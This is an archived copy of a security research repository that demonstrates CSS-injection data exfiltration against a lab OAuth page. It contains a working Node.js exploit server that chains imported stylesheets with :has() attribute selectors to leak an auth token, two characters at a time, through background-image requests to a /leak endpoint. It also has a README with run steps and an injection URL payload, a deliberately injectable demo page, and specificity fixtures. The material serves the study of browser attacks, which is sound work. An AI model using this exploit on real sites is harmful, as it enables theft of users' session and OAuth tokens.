---
type: Code
title: CSS-Exfiltration
description: Contains the CSS exfiltration test environment and selector-priority examples accompanying the OAuth-token case. Its extraction server supplies sequential imported styles and progressively stronger selectors, while paired fixtures illustrate how the CSS cascade can suppress later probing rules. The lab uses a fixed token length and shared extraction state.
resource: "https://github.com/VoorivexTeam/CSS-Exfiltration/tree/06e8e661d0598781ac954aedf028c55c1b6ce0c5"
tags: [code, webseclist-reference, voorivex, css-injection, dom, info-leak, tooling, owasp-a03-2021]
generated:
  by: webseclist-refs/1
  at: "2026-09-13T22:24:39+00:00"
verified:
  - by: AI archive validation
    at: 2026-09-13
status: stable
stale_after: 2027-09-13
sources:
  - id: original
    resource: "https://github.com/VoorivexTeam/CSS-Exfiltration/tree/06e8e661d0598781ac954aedf028c55c1b6ce0c5"
    title: CSS-Exfiltration
also_at: []
authors: []
canonical_url: ""
cited_by:
  - "2025.md:108"
commit: ""
content_sha256: 7d279189264f9a3fcc8ffacf6fa84e6eb9697ace08fa26e6d5097c79081d7cfc
depth: full
depth_reason: default
kind: code
language: ""
licence: unknown
original_url: "https://github.com/VoorivexTeam/CSS-Exfiltration/tree/06e8e661d0598781ac954aedf028c55c1b6ce0c5"
published: ""
publisher: Voorivex
publisher_english: ""
raw_sha256: 3a54a965b7bef17a6d83859903563dffdf466add1e119eb0deb2e6c01936ea66
retrieved_from: "https://github.com/VoorivexTeam/CSS-Exfiltration/tree/06e8e661d0598781ac954aedf028c55c1b6ce0c5"
retrieved_kind: manual-import
retrieved_utc: "2026-09-13T22:24:39+00:00"
slug: voorivex-css-exfiltration
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# CSS-Exfiltration

**CSS-Exfiltration** - Author not stated, Voorivex.

- Published: date not stated
- Original: <https://github.com/VoorivexTeam/CSS-Exfiltration/tree/06e8e661d0598781ac954aedf028c55c1b6ce0c5>
- Preserved from: https://github.com/VoorivexTeam/CSS-Exfiltration/tree/06e8e661d0598781ac954aedf028c55c1b6ce0c5 (manual-import) on 2026-09-13
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# CSS-Exfiltration

Authors: 

Source: https://github.com/VoorivexTeam/CSS-Exfiltration/tree/06e8e661d0598781ac954aedf028c55c1b6ce0c5

> Preservation note: These are the complete text contents of the reviewed files from this pinned revision. File contents were checked against their Git blob hashes. This document preserves source text for reading; it is not a runnable repository copy.

## README.md

# CSS-Exfiltration
<p align="center">
  <img src="css-data-exfiltration.png" alt="Cover Image">
</p>

1. Run the code with:
```
python3 -m http.server
```
2. run the exploit;
```
nodejs exploit.js
```
3. Open the link with exploit:
```
http://localhost:8000/?input=%3Ch1%3E%3C/h1%3E%3Cstyle%3E@import%20%27//localhost:3000/start%27;%3C/style%3E
```

## exploit.js

````javascript
const http = require('http');
const url = require('url');
const port = 3000;

const HOSTNAME = "http://localhost:3000";
const CHARS = '0123456789abcdefghijklmnopqrstuvwxyz-'.split('');

const DEBUG = false;

var prefix = "&auth_token=";
var leaked_data = "";

var pendingResponse = null;
var stop = false,
    n = 0;

const requestHandler = (request, response) => {
    let req = url.parse(request.url, true);
    log('\treq: %s', request.url);

    if (stop) {
        return response.end();
    }

    if (req.pathname === '/start') {
        genResponse(response);
    } else if (req.pathname === '/leak') {
        response.end();

        if (req.query.chars) {
            leaked_data += req.query.chars;

            if (pendingResponse) {
                genResponse(pendingResponse);
                pendingResponse = null;
            }

            if (leaked_data.length === 36) {
                process.stdout.write('\n');
                process.exit(1);
            }
        }
    } else if (req.pathname === '/next') {
        pendingResponse = response;
    } else {
        response.end();
    }
};

const genResponse = (response) => {
    process.stdout.clearLine(0);
    process.stdout.cursorTo(0);
    process.stdout.write(`Leaked: ${leaked_data}`);

    let css = `@import url(${HOSTNAME}/next?${Math.random()});` +
        CHARS.map(e =>
            CHARS.map(f =>
                `html:has(script[src*="${prefix + leaked_data}${e}${f}"]) div${':is(div)'.repeat(n + 1)} {
                    background: url(${HOSTNAME}/leak?chars=${e}${f}&cb=${Math.random()}) !important; 
                    display: block !important;
                }`
            )
        ).flat().join('');

    response.writeHead(200, { 'Content-Type': 'text/css' });
    response.write(css);
    response.end();

    n++;
};

const server = http.createServer(requestHandler);

server.listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }

    console.log('[+] Server is listening on %d', port);
});

function log() {
    if (DEBUG) console.log.apply(console, arguments);
}
````

## index.html

````html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OAuth Page</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.3/purify.min.js"></script>
    <style>
        body {
            font-family: monospace, monospace;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(to right, #6a11cb, #2575fc);
            color: #fff;
        }

        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 20px 40px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        h1 {
            font-size: 2.5em;
            margin: 0 0 10px;
        }

        p {
            font-size: 1.2em;
            margin: 0;
        }

        .token {
            margin-top: 20px;
            padding: 10px 15px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            word-break: break-all;
        }

        .footer {
            margin-top: 20px;
            font-size: 0.9em;
            opacity: 0.7;
        }
    </style>
</head>

<body>
    <div class="container">
        <p>Your input will appear below if available:</p><br>
        <div id="input-container" class="input"></div>
    </div>

    <script src="https://sandbox.com/?param=value&auth_token=494daa91-2ed4-4132-9e06-b4a5d696750e"></script>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const input = urlParams.get('input');

        if (input) {
            const sanitizedInput = DOMPurify.sanitize(input);
            const inputContainer = document.getElementById('input-container');
            inputContainer.innerHTML = sanitizedInput;
        } else {
            const inputContainer = document.getElementById('input-container');
            inputContainer.innerHTML = 'No input available';
        }
    </script>
</body>

</html>
````

## priority-ok/blue.css

````css
html:has(script[src*="?auth_token=10"]) div:is(div) {
    background-color: blue;
    display: block;
}
````

## priority-ok/index.html

````html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSS Specificity</title>
    <link rel="stylesheet" type="text/css" href="red.css">
</head>

<body>
    <script src="https://sandbox.com/?auth_token=1010"></script>
    <div>
        This is zodd!
    </div>
</body>

</html>
````

## priority-ok/red.css

````css
@import 'blue.css';
html:has(script[src*="?auth_token=10"]) div {
    background-color: red;
    display: block;
}
````

## priority/blue.css

````css
html:has(script[src*="?auth_token=10"]) div {
    background-color: blue;
    display: block;
}
````

## priority/index.html

````html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSS Specificity</title>
    <link rel="stylesheet" type="text/css" href="red.css">
</head>

<body>
    <script src="https://sandbox.com/?auth_token=1010"></script>
    <div>
        This is zodd!
    </div>
</body>

</html>
````

## priority/red.css

````css
@import 'blue.css';
html:has(script[src*="?auth_token=10"]) div {
    background-color: red;
    display: block;
}
````
